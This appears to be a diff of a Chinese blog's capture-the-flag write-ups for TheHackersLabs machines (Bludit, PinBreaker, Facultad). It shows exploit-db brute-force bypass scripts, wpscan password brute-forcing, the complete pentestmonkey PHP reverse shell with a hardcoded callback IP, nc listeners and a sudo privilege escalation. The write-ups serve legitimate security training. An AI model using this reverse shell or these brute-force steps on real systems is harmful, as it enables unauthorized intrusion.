@@ -2314,7 +2314,7 @@ Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
 可以上[官网](https://www.bludit.com/)看到，最新版本都到3.16.2了，接下来看看cve
 
 ```bash
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ searchsploit bludit
+(base) yolo@yolo:~$ searchsploit bludit
 ------------------------------------------------------------------------------ ---------------------------------
  Exploit Title                                                                |  Path
 ------------------------------------------------------------------------------ ---------------------------------
@@ -2332,24 +2332,24 @@ Bludit CMS v3.14.1 - Stored Cross-Site Scripting (XSS) (Authenticated)        | 
 bludit Pages Editor 3.0.0 - Arbitrary File Upload                             | php/webapps/46060.txt
 ------------------------------------------------------------------------------ ---------------------------------
 Shellcodes: No Results
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ searchsploit -m 48746.rb
+(base) yolo@yolo:~$ searchsploit -m 48746.rb
   Exploit: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
       URL: https://www.exploit-db.com/exploits/48746
      Path: /snap/searchsploit/542/opt/exploitdb/exploits/php/webapps/48746.rb
     Codes: CVE-2019-17240
  Verified: True
 File Type: <missing file package>
-Copied to: /home/yolo/Desktop/tools/Bludit-3.9.2-Auth-Bypass/48746.rb
+Copied to: /home/yolo/48746.rb
 
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ searchsploit -m 48701.txt
+(base) yolo@yolo:~$ searchsploit -m 48701.txt
   Exploit: Bludit 3.9.2 - Directory Traversal
       URL: https://www.exploit-db.com/exploits/48701
      Path: /snap/searchsploit/542/opt/exploitdb/exploits/multiple/webapps/48701.txt
     Codes: CVE-2019-16113
  Verified: False
 File Type: <missing file package>
-Copied to: /home/yolo/Desktop/tools/Bludit-3.9.2-Auth-Bypass/48701.txt
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ cat 48701.txt | less
+Copied to: /home/yolo/48701.txt
+(base) yolo@yolo:~/$ cat 48701.txt | less
 
 ```
 
@@ -2358,7 +2358,7 @@ Copied to: /home/yolo/Desktop/tools/Bludit-3.9.2-Auth-Bypass/48701.txt
 这里我其实尝试过用yakit或burp抓包爆破账密，但是失败了，这里绝对有限制，`Bludit CMS`在登录接口`/admin/login`中有一个暴力破解防护机制，它通过检测客户端的IP地址来判断是否有多次错误登录尝试，就是说短时间爆破是不可能成功的，然后呢，这个exp会在每次请求的时候伪造一个新IP来绕过防护机制，从而实现无限制暴力破解
 
 ```bash
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ cat 48746.rb
+(base) yolo@yolo:~$ cat 48746.rb
 #!/usr/bin/env ruby
 ## Title: Bludit  3.9.2 - Authentication Bruteforce Mitigation Bypass
 ## Author: noraj (Alexandre ZANNI)
@@ -2457,7 +2457,7 @@ rescue Docopt::Exit => e
 <img src="/assets/img/thehackerslabs-notes/image-20251120214839804.png" alt="image-20251120214839804" style="zoom:50%;" />
 
 ```bash
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ ruby 48746.rb -r http://jaulacon2025.thl -u Jaulacon2025 -w /snap/seclists/rockyou.txt
+(base) yolo@yolo:~$ ruby 48746.rb -r http://jaulacon2025.thl -u Jaulacon2025 -w /snap/seclists/rockyou.txt
 [*] Trying password: 123456
 ......
 
@@ -2467,7 +2467,7 @@ rescue Docopt::Exit => e
 拿到了账密，然后呢，用第二个payload，这里需要我自己写几个🐎
 
 ```bash
-(base) yolo@yolo:~/Desktop/tools/Bludit-3.9.2-Auth-Bypass$ head -n 40 48701.py
+(base) yolo@yolo:~$ head -n 40 48701.py
 # Title: Bludit 3.9.2 - Directory Traversal
 # Author: James Green
 # Date: 2020-07-20
@@ -2778,3 +2778,1073 @@ busctl 会调用：
 ---
 
 嗷，对了，上面这个payload是我在[GTFObins](https://gtfobins.github.io/gtfobins/busctl/)里面找到的
+
+## PinBreaker
+> **提示:** 靶机跳转传送门
+[PinBreaker](https://labs.thehackerslabs.com/machines/68)
+
+<img src="/assets/img/thehackerslabs-notes/PinBreaker.png" alt="PinBreaker" style="zoom:50%;" />
+
+
+> 说句客观的评价，这个题其实一点也不算渗透，额，就是评价不是很高的意思
+
+先翻译一下pdf中的题目信息
+
+> Tu objetivo es simple: desbloquear esta app.
+>
+> Revisa la APK, busca pistas dentro del código y encuentra el PIN
+>
+> correcto.
+>
+> Una vez tengas el PIN, calcula su hash SHA256, y será el valor de
+>
+> la flag
+>
+> ¡Suerte!
+>
+> 你的目标很简单：**解锁这个应用**。
+> 请检查 APK，在代码中寻找线索，找出正确的 **PIN**。
+> 一旦你获得 PIN，计算它的 **SHA256 哈希值**，这个哈希就是你要提交的 **flag**。
+> 祝你好运！
+
+用jadx直接逆向处理，在com下的主代码中，会发现硬编码了pin，直接sha256计算
+
+<img src="/assets/img/thehackerslabs-notes/image-20251121215525181.png" alt="image-20251121215525181" style="zoom:50%;" />
+
+这里也有个小坑
+
+```bash
+(base) yolo@yolo:~$ echo -n "8524947156" | sha256sum
+0341ffa4c13efb648852cb673998b1658f272639727c444edabcde213f??????  -
+(base) yolo@yolo:~$ echo  "8524947156" | sha256sum
+2a4be6606b9490b9955c7aac8e856c8e3098f9b15e98a8985ce5c19204??????  -
+```
+
+我提前意识到，这里可能不能包括换行符，就用-n自动过滤，没想到结果不对，第二条命令的结果是正确的，然后呢，没想到的是user和root的flag是一模一样的
+
+> 讲真，第一次在渗透中碰到apk，以为能学到一些新东西呢
+
+## Facultad
+> **提示:** 靶机跳转传送门
+[Facultad](https://labs.thehackerslabs.com/machines/36)
+
+<img src="/assets/img/thehackerslabs-notes/Facultad.png" alt="Facultad" style="zoom:50%;" />
+### 信息搜集
+
+扫描端口
+
+```bash
+(base) yolo@yolo:~$ nmap -sV -Pn 10.161.170.2
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-21 22:13 CST
+Nmap scan report for 10.161.170.2
+Host is up (0.84s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.62 ((Debian))
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.37 seconds
+```
+
+okey,直接看web服务
+
+主页面没有看出来什么关键信息，扫描路径，拿到几个
+
+```bash
+(base) yolo@yolo:~$ dirsearch -u http://10.161.170.2/
+/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/yolo/reports/http_10.161.170.2/__25-11-21_22-14-39.txt
+
+Target: http://10.161.170.2/
+
+[22:14:39] Starting:
+[22:14:39] 403 -  277B  - /.ht_wsr.txt
+[22:14:39] 403 -  277B  - /.htaccess.sample
+[22:14:39] 403 -  277B  - /.htaccess.save
+[22:14:39] 403 -  277B  - /.htaccess.bak1
+[22:14:39] 403 -  277B  - /.htaccess.orig
+[22:14:39] 403 -  277B  - /.htaccess_extra
+[22:14:40] 403 -  277B  - /.htaccess_orig
+[22:14:40] 403 -  277B  - /.htaccessOLD2
+[22:14:40] 403 -  277B  - /.htaccessOLD
+[22:14:40] 403 -  277B  - /.htaccessBAK
+[22:14:40] 403 -  277B  - /.htaccess_sc
+[22:14:40] 403 -  277B  - /.htm
+[22:14:40] 403 -  277B  - /.htpasswds
+[22:14:40] 403 -  277B  - /.html
+[22:14:40] 403 -  277B  - /.httr-oauth
+[22:14:40] 403 -  277B  - /.htpasswd_test
+[22:14:40] 403 -  277B  - /.php
+[22:14:48] 301 -  316B  - /education  ->  http://10.161.170.2/education/
+[22:14:49] 301 -  313B  - /images  ->  http://10.161.170.2/images/
+[22:14:49] 200 -  457B  - /images/
+[22:14:56] 403 -  277B  - /server-status/
+[22:14:56] 403 -  277B  - /server-status
+
+Task Completed
+```
+
+值得庆祝的是，education路由下面是一个博客系统，然后这里的images路由下面，有一个图片（暂时不晓得什么用处
+
+那个博客系统上出现域名错误，显然，我需要更改hosts
+
+<img src="/assets/img/thehackerslabs-notes/image-20251121221927631.png" alt="image-20251121221927631" style="zoom:50%;" />
+
+
+
+Linux中的话，在/etc/hosts中更改内容，然后Windows中的话，需要在"C:\Windows\System32\drivers\etc\hosts"中更改
+
+更改内容一样，都是在文件末尾加上`10.161.170.2 facultad.thl`
+
+正常来说，两个系统更改hosts都是需要高权限的
+
+接下来呢，再次深度扫描路径
+
+```bash
+(base) yolo@yolo:~$ dirsearch -u http://10.161.170.2/education/
+/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/yolo/reports/http_10.161.170.2/_education__25-11-21_22-22-57.txt
+
+Target: http://10.161.170.2/
+
+[22:22:57] Starting: education/
+[22:22:58] 403 -  277B  - /education/.ht_wsr.txt
+[22:22:58] 403 -  277B  - /education/.htaccess.bak1
+[22:22:58] 403 -  277B  - /education/.htaccess.sample
+[22:22:58] 403 -  277B  - /education/.htaccess.save
+[22:22:58] 403 -  277B  - /education/.htaccess.orig
+[22:22:58] 403 -  277B  - /education/.htaccess_extra
+[22:22:58] 403 -  277B  - /education/.htaccess_sc
+[22:22:58] 403 -  277B  - /education/.htaccess_orig
+[22:22:58] 403 -  277B  - /education/.htaccessBAK
+[22:22:58] 403 -  277B  - /education/.htaccessOLD
+[22:22:58] 403 -  277B  - /education/.htaccessOLD2
+[22:22:58] 403 -  277B  - /education/.htm
+[22:22:58] 403 -  277B  - /education/.html
+[22:22:58] 403 -  277B  - /education/.htpasswd_test
+[22:22:58] 403 -  277B  - /education/.htpasswds
+[22:22:58] 403 -  277B  - /education/.httr-oauth
+[22:22:58] 403 -  277B  - /education/.php
+[22:23:08] 301 -    0B  - /education/index.php  ->  http://10.161.170.2/education/
+[22:23:08] 301 -    0B  - /education/index.php/login/  ->  http://10.161.170.2/education/login/
+[22:23:09] 200 -    7KB - /education/license.txt
+[22:23:13] 200 -    3KB - /education/readme.html
+[22:23:19] 301 -  325B  - /education/wp-admin  ->  http://10.161.170.2/education/wp-admin/
+[22:23:19] 200 -    0B  - /education/wp-content/
+[22:23:19] 301 -  327B  - /education/wp-content  ->  http://10.161.170.2/education/wp-content/
+[22:23:19] 200 -    0B  - /education/wp-config.php
+[22:23:19] 400 -    1B  - /education/wp-admin/admin-ajax.php
+[22:23:19] 500 -    0B  - /education/wp-content/plugins/hello.php
+[22:23:19] 200 -   84B  - /education/wp-content/plugins/akismet/akismet.php
+[22:23:19] 301 -  328B  - /education/wp-includes  ->  http://10.161.170.2/education/wp-includes/
+[22:23:19] 200 -    0B  - /education/wp-includes/rss-functions.php
+[22:23:19] 200 -    5KB - /education/wp-includes/
+[22:23:19] 200 -    0B  - /education/wp-cron.php
+[22:23:19] 302 -    0B  - /education/wp-signup.php  ->  http://facultad.thl/education/wp-login.php?action=register
+[22:23:19] 200 -    2KB - /education/wp-login.php
+[22:23:19] 302 -    0B  - /education/wp-admin/  ->  http://facultad.thl/education/wp-login.php?redirect_to=http%3A%2F%2F10.161.170.2%2Feducation%2Fwp-admin%2F&reauth=1
+[22:23:19] 500 -    3KB - /education/wp-admin/setup-config.php
+[22:23:19] 200 -  506B  - /education/wp-admin/install.php
+[22:23:19] 405 -   42B  - /education/xmlrpc.php
+
+Task Completed
+```
+
+okey,关于wordpress的漏洞挖掘，有个很好用的工具wpscan
+
+```bash
+(base) yolo@yolo:~$ wpscan --api-token 我的api_key --url http://facultad.thl/edu
+cation -e u,vp --plugins-detection aggressive
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+......省略了一些......
+
+[+] XML-RPC seems to be enabled: http://facultad.thl/education/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://facultad.thl/education/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://facultad.thl/education/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.7.1 identified (Insecure, released on 2024-11-21).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://facultad.thl/education/?feed=rss2, <generator>https://wordpress.org/?v=6.7.1</generator>
+ |  - http://facultad.thl/education/?feed=comments-rss2, <generator>https://wordpress.org/?v=6.7.1</generator>
+ |
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: WP < 6.8.3 - Author+ DOM Stored XSS
+ |     Fixed in: 6.7.4
+ |     References:
+ |      - https://wpscan.com/vulnerability/c4616b57-770f-4c40-93f8-29571c80330a
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58674
+ |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-cross-site-scripting-xss-vulnerability
+ |      -  https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
+ |
+ | [!] Title: WP < 6.8.3 - Contributor+ Sensitive Data Disclosure
+ |     Fixed in: 6.7.4
+ |     References:
+ |      - https://wpscan.com/vulnerability/1e2dad30-dd95-4142-903b-4d5c580eaad2
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-58246
+ |      - https://patchstack.com/database/wordpress/wordpress/wordpress/vulnerability/wordpress-wordpress-wordpress-6-8-2-sensitive-data-exposure-vulnerability
+ |      - https://wordpress.org/news/2025/09/wordpress-6-8-3-release/
+
+[+] WordPress theme in use: twentytwentyfive
+ | Location: http://facultad.thl/education/wp-content/themes/twentytwentyfive/
+ | Last Updated: 2025-08-05T00:00:00.000Z
+ | Readme: http://facultad.thl/education/wp-content/themes/twentytwentyfive/readme.txt
+ | [!] The version is out of date, the latest version is 1.3
+ | [!] Directory listing is enabled
+ | Style URL: http://facultad.thl/education/wp-content/themes/twentytwentyfive/style.css?ver=1.0
+ | Style Name: Twenty Twenty-Five
+ | Style URI: https://wordpress.org/themes/twentytwentyfive/
+ | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://facultad.thl/education/wp-content/themes/twentytwentyfive/style.css?ver=1.0, Match: 'Version: 1.0'
+
+[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
+ Checking Known Locations - Time: 00:00:08 <==============================> (7343 / 7343) 100.00% Time: 00:00:08
+[+] Checking Plugin Versions (via Passive and Aggressive Methods)
+
+[i] Plugin(s) Identified:
+
+[+] akismet
+ | Location: http://facultad.thl/education/wp-content/plugins/akismet/
+ | Latest Version: 5.6
+ | Last Updated: 2025-11-12T16:31:00.000Z
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://facultad.thl/education/wp-content/plugins/akismet/, status: 403
+ |
+ | [!] 1 vulnerability identified:
+ |
+ | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
+ |     Fixed in: 3.1.5
+ |     References:
+ |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
+ |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
+ |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
+ |
+ | The version could not be determined.
+
+[+] wp-file-manager
+ | Location: http://facultad.thl/education/wp-content/plugins/wp-file-manager/
+ | Last Updated: 2025-06-04T11:21:00.000Z
+ | Readme: http://facultad.thl/education/wp-content/plugins/wp-file-manager/readme.txt
+ | [!] The version is out of date, the latest version is 8.0.2
+ |
+ | Found By: Known Locations (Aggressive Detection)
+ |  - http://facultad.thl/education/wp-content/plugins/wp-file-manager/, status: 200
+ |
+ | [!] 1 vulnerability identified:
+ |
+ | [!] Title: Multiple elFinder Plugins - Arbitrary File Deletion via Traversal
+ |     Fixed in: 8.4.3
+ |     References:
+ |      - https://wpscan.com/vulnerability/9569aaa4-719a-4f2e-b5f4-e74fe84e7ad8
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-0818
+ |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/c2a166de-3bdf-4883-91ba-655f2757c53b
+ |
+ | Version: 8.0.1 (100% confidence)
+ | Found By: Readme - Stable Tag (Aggressive Detection)
+ |  - http://facultad.thl/education/wp-content/plugins/wp-file-manager/readme.txt
+ | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
+ |  - http://facultad.thl/education/wp-content/plugins/wp-file-manager/readme.txt
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <==================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] Facultad
+ | Found By: Rss Generator (Passive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] facultad
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] WPScan DB API OK
+ | Plan: free
+ | Requests Done (during the scan): 4
+ | Requests Remaining: 21
+
+[+] Finished: Sat Nov 22 00:36:54 2025
+[+] Requests Done: 7426
+[+] Cached Requests: 10
+[+] Data Sent: 2.119 MB
+[+] Data Received: 23.79 MB
+[+] Memory used: 300.465 MB
+[+] Elapsed time: 00:00:18
+
+(base) yolo@yolo:~$ wpscan  --url http://facultad.thl/education -U facultad -P /snap/seclists/rockyou.txt -t 30
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.28
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://facultad.thl/education/ [10.161.170.2]
+[+] Started: Sat Nov 22 00:47:35 2025
+
+Interesting Finding(s):
+
+......省略了一些......
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:04 <=================================> (137 / 137) 100.00% Time: 00:00:04
+
+[i] No Config Backups Found.
+
+[+] Performing password attack on Xmlrpc against 1 user/s
+[SUCCESS] - facultad / asdfghjkl
+Trying facultad / minnie Time: 00:00:17 <                               > (420 / 14344811)  0.00%  ETA: ??:??:??
+
+[!] Valid Combinations Found:
+ | Username: facultad, Password: asdfghjkl
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Sat Nov 22 00:48:02 2025
+[+] Requests Done: 592
+[+] Cached Requests: 5
+[+] Data Sent: 275.555 KB
+[+] Data Received: 454.28 KB
+[+] Memory used: 293.742 MB
+[+] Elapsed time: 00:00:27
+```
+
+漏洞检测发现了一个wp-file-manager插件，这里可能有个解决方案，就是触发wordpress重装，然后呢，这里还有个用户名，叫facultad，顺手用wpscan进行密码爆破，发现可以爆破出来
+
+### get shell
+
+登录进去后，可以使用那个file-manager插件，上传我们的弹shell的php文件，我找了个板子，放这里了
+
+```bash
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.161.248.64';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?> 
+```
+
+然后本地进行监听`nc -lvnp 1234`
+
+浏览器直接访问`http://facultad.thl/education/php-reverse-shell.php`触发🐎
+
+接下来使用ps aux，是可以发现vivian用户定时执行一个sh文件，但是很可惜一点，当前我们没有任何权限进行编辑文件
+
+```bash
+─[user@parrot]─[~]
+└──╼ $nc -lvnp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.161.170.2 39038
+Linux TheHackersLabs-facultad.thl 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64 GNU/Linux
+ 07:23:45 up  1:20,  3 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+www-data pts/1    -                06:59   24:16   2.04s  0.01s sudo -u gabri /usr/bin/php shell.php
+vivian   pts/3    10.161.155.145   07:13    6:30   0.01s  0.01s /usr/bin/script -qc /bin/bash /dev/null
+vivian   pts/5    -                07:17    6:30   0.00s  0.02s sudo /opt/vivian/script.sh
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ls -ld /opt/vivian/
+drwxr-xr-x 2 vivian vivian 4096 Nov 22 07:17 /opt/vivian/
+$ ls -la /opt/vivian/script.sh
+-rwxr-xr-x 1 vivian vivian 25 Nov 22 07:17 /opt/vivian/script.sh
+$ cat /opt/vivian/script.sh
+#!/bin/bash
+echo "Ejecutado como vivian para mis alumnos"
+$ sudo -l
+sudo: Matching Defaults entries for www-data on TheHackersLabs-facultad:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User www-data may run the following commands on TheHackersLabs-facultad:
+    (gabri) NOPASSWD: /usr/bin/php
+unable to resolve host TheHackersLabs-facultad.thl: Name or service not known
+```
+
+然后再仔细观察下shell连接提供的信息，这里的www-data有个sudo权限，就是说指定用户名是gabri的时候，可以直接以gabri的用户权限运行php文件，那就继续用上面给的php🐎,但是一定要记住，新建一个终端，然后把端口换一个新的
+
+```bash
+$ sudo -u gabri /usr/bin/php shell.php
+sudo: unable to resolve host TheHackersLabs-facultad.thl: Name or service not known
+---新终端中---
+┌─[user@parrot]─[~]
+└──╼ $nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.161.170.2 41246
+/bin/sh: 0: can't access tty; job control turned off
+$ sh: turning off NDELAY mode
+$ id
+uid=1001(gabri) gid=1001(gabri) groups=1001(gabri)
+$ 
+```
+
+弹shell成功后，发现这里没有sudo权限，连家目录都没有，那么的话，只能全局查找属于gabri的文件
+
+```bash
+$ find / -user "gabri" 2>/dev/null > findfiles.log
+$ head -n 10 findfiles.log
+/tmp/findfiles
+/tmp/ps.log
+/tmp/findfiles.log
+/var/mail/gabri
+/var/mail/gabri/.password_vivian.bf
+/proc/2330
+/proc/2330/task
+/proc/2330/task/2330
+/proc/2330/task/2330/fd
+/proc/2330/task/2330/fd/0
+```
+
